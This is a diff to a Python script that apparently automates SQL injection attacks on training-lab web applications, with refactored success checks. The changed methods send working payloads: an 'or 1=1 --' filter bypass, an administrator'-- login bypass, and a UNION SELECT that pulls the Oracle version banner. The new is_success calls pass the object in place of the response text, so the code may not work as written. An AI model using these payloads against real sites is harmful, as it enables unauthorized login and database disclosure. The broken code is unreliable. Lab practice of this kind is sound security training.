@@ -4,7 +4,7 @@ from pathlib import Path
 PYTHON_PATH = Path(__file__).parent.parent
 
 sys.path.append(str(PYTHON_PATH))
-from config import parse_args
+from config import parse_args, is_success
 args, proxy = parse_args()
 
 
@@ -70,14 +70,6 @@ class Sqli:
         except requests.exceptions.RequestException as e:
             print(f"Error: Network request failed - {e}")
             return False
-    
-    def is_success(self, html_text):
-        string_match = r'Congratulations, you solved the lab!'
-        match = re.match(string_match, html_text)
-        if not match:
-            return False
-        return True
-
 
     def released_sqli(self):
         print("Trying released sqli")
@@ -85,7 +77,7 @@ class Sqli:
         if exploit_result.status_code != 200:
             return False
         
-        if not self.is_success(exploit_result.text):
+        if not is_success(self):
             return False 
         
         print("Exploit successfull.\nPayload: or 1=1 --")  
@@ -97,6 +89,10 @@ class Sqli:
         login_get_status = self.check_login()
         if not login_post_status and not login_get_status:
             return False
+        
+        if not is_success(self):
+            return False 
+        
         print("Exploit successfull.\nPayload: administrator'--")
         return True
     
@@ -104,6 +100,10 @@ class Sqli:
         exploit_result = self.session.get(url=f"{self.url}/filter?category=' union select null, banner from v$version --")
         if exploit_result.status_code != 200:
             return False
+        
+        if not is_success(self):
+            return False 
+
         print("Exploit successfull. \nPayload: union select null, banner from v$version --")
     
     def main(self):
